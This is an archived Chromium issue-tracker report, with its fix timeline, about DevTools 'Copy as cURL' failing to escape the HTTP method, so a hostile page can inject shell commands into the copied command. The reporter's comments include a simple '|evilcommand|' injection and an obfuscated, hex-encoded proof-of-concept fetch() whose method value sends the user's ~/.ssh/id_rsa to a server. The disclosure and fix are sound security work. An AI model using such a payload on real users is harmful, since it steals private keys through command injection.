# Security: 'Copy As Curl' in the network panel of the devtools does not escape the HTTP method properly, leading to local code execution

| Field | Value |
|-------|-------|
| **Issue ID** | [40051166](https://issues.chromium.org/issues/40051166) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Network |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | pe...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2020-01-08 |
| **Bounty** | $500.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/master/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**  

The chrome dev tools have a 'network' panel, where all the requests made by the current webpage are listed.  

In this panel, the user can right-click on a query, and then select 'Copy As cURL'. The user is then expected to paste what he just copied into a terminal.  

The issue is that the HTTP method of the request, which is controlled by the potentially malicious webpage, is not escaped when the curl command is formed.

As an example, the following javascript snippet will make a problematic request:

fetch('', {method: '|evilcommand|'});

When this snippet is run, and then a naive user uses 'Copy as cURL' on the generated request and then pastes it into a terminal, evilcommand is executed.

Note: an HTTP verb cannot contain a space (so one can not launch evilcommand with arguments), but the following characters are allowed, making it possible to construct complex malicious payloads: ` ' . \* $ & | ~.

**VERSION**  

Chrome Version: Version 78.0.3882.0 (Developer Build) (64-bit)  

Operating System: MacOS 10.15.2 (19C57)

**REPRODUCTION CASE**

1. Serve the attached bug.html locally
2. Open the network panel of the dev tools
3. Right-click bug.html, then choose copy, then copy as cURL
4. Open a terminal, paste the result and press enter

Expected behavior:  

A request is made by curl to /bug.html with '|evilcommand|' as the HTTP verb

Actual behavior  

evilcommand is executed locally on the user's computer

## Attachments

- [bug.html](attachments/bug.html) (text/plain, 57 B)

## Timeline

### pe...@gmail.com (2020-01-08)

The source of the bug seems to be in NetworkLogView.js, where the HTTP method is added to the command without any escaping :

https://github.com/ChromeDevTools/devtools-frontend/blob/172d5213f9a6f0f3dddb77246f2ccb97ca656388/front_end/network/NetworkLogView.js#L1891

### pe...@gmail.com (2020-01-08)

Here is an example exploit (that demonstrates that the bug is exploitable despite the limitation in the set of characters allowed in an HTTP verb) :

    fetch('/', {method: '&echo$IFS`echo`6375726c206c6f63616c686f73743a39393939202d2d64617461202224283c207e2f2e7373682f69645f72736129220a|xxd$IFS`echo`-r$IFS`echo`-p|sh&'});


When the generated request is copied as cURL and pasted to a terminal, the user's ssh private key is sent to a server (localhost:9999 in this example).

### mb...@chromium.org (2020-01-08)

sadrul: Could you please take a look or help find an owner for this?

[Monorail components: Platform>DevTools>Network]

### ha...@chromium.org (2020-01-08)

[Empty comment from Monorail migration]

### ha...@chromium.org (2020-01-09)

[Empty comment from Monorail migration]

### ja...@chromium.org (2020-01-09)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-01-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/devtools/devtools-frontend/+/a4e536a0953df01d14c451edb2d63cb35bd7bf09

commit a4e536a0953df01d14c451edb2d63cb35bd7bf09
Author: Jan Scheffler <janscheffler@chromium.org>
Date: Thu Jan 09 09:31:16 2020

Escape HTTP method for "Copy as cURL"

This patch will escape the http method in the generated copy as
curl command in the network panel.

Fixed: chromium:1040080
Test: crrev.com/c/1992425
Change-Id: I31f07b84efdf2fe377e6a9e228453812ea06152e
Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/1991504
Commit-Queue: Jan Scheffler <janscheffler@chromium.org>
Reviewed-by: Benedikt Meurer <bmeurer@chromium.org>

[modify] https://crrev.com/a4e536a0953df01d14c451edb2d63cb35bd7bf09/front_end/network/NetworkLogView.js


### ha...@chromium.org (2020-01-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-01-09)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-01-09)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-14)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-01-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b28f0cb9a0874350ecc8c61ae49ff083c8eee635

commit b28f0cb9a0874350ecc8c61ae49ff083c8eee635
Author: Jan Scheffler <janscheffler@chromium.org>
Date: Wed Jan 29 12:42:56 2020

[DevTools] Test if copy as fetch escapes http method

This cl adds a test to prevent regression on crbug.com/1040080.

Bug: chromium:1040080
Change-Id: I3611507c042c296e3923434b6ddc269ab63f98da
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1992425
Reviewed-by: Benedikt Meurer <bmeurer@chromium.org>
Reviewed-by: Sigurd Schneider <sigurds@chromium.org>
Commit-Queue: Jan Scheffler <janscheffler@chromium.org>
Cr-Commit-Position: refs/heads/master@{#736330}

[modify] https://crrev.com/b28f0cb9a0874350ecc8c61ae49ff083c8eee635/third_party/blink/web_tests/http/tests/devtools/copy-network-request-expected.txt
[modify] https://crrev.com/b28f0cb9a0874350ecc8c61ae49ff083c8eee635/third_party/blink/web_tests/http/tests/devtools/copy-network-request.js


### na...@google.com (2020-01-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-01-30)

Congrats! The Panel decided to award $500 for this report!

### na...@google.com (2020-01-30)

[Empty comment from Monorail migration]

### ad...@google.com (2020-03-09)

pere.jobs@gmail.com - when this appears in the Chrome release notes, how would you like to be credited?

### pe...@gmail.com (2020-03-09)

I would love to :) You can credit me as @lovasoa (Ophir LOJKINE)

By the way, do you have any information about when the reward payment will happen ? It has now been 40 days and I still haven't received anything.

### ad...@google.com (2020-03-13)

Thanks! I've pointed out your comment to the VRP folks so they should be able to look into it.

### ad...@google.com (2020-03-13)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-03-13)

[Empty comment from Monorail migration]

### na...@google.com (2020-03-18)

Hi - I will follow up with a payment team and see why this is taking so long. 

### ad...@chromium.org (2020-04-14)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-18)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-04-18)

This issue was migrated from crbug.com/chromium/1040080?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051166)*
